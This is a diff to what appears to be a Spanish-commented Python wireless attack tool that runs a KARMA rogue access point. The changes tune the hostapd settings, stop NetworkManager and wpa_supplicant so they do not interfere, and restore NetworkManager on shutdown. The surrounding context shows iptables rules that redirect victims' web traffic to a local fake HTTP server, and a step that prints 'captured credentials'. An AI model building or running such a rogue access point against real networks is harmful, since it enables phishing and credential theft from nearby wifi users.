@@ -3717,6 +3717,8 @@ ignore_broadcast_ssid=0
 ap_isolate=0
 auth_algs=1
 wpa=0
+ieee80211n=1
+wmm_enabled=1
 """)
 
     # dnsmasq
@@ -3815,9 +3817,12 @@ class H(BaseHTTPRequestHandler):
 HTTPServer(("0.0.0.0", 80), H).serve_forever()
 """)
 
-    # ── Preparar interfaz: managed mode, matar conflictos ────────────────────
+    # ── Preparar interfaz: matar conflictos y poner en managed ───────────────
     info("Preparando interfaz...")
-    run("pkill -f hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null; sleep 0.3", capture=True)
+    run("pkill -f hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null; pkill -f server.py 2>/dev/null; sleep 0.3", capture=True)
+    # Desactivar NetworkManager e wpa_supplicant para que no interfieran con el AP
+    run("systemctl stop NetworkManager 2>/dev/null; systemctl stop wpa_supplicant 2>/dev/null")
+    run("rfkill unblock wifi 2>/dev/null")
     run(f"ip link set {iface_ap} down 2>/dev/null")
     run(f"iw dev {iface_ap} set type managed 2>/dev/null")
     run(f"ip link set {iface_ap} up 2>/dev/null")
@@ -3895,6 +3900,8 @@ HTTPServer(("0.0.0.0", 80), H).serve_forever()
         run(f"iptables -t nat -D PREROUTING -i {iface_ap} -p tcp --dport 443 -j DNAT --to-destination 192.168.20.1:80 2>/dev/null")
         if iface_net:
             run(f"iptables -t nat -D POSTROUTING -o {iface_net} -j MASQUERADE 2>/dev/null")
+        # Restaurar NetworkManager
+        run("systemctl start NetworkManager 2>/dev/null")
         ok("KARMA detenido.")
         if os.path.exists(creds_file):
             separador("CREDENCIALES CAPTURADAS")
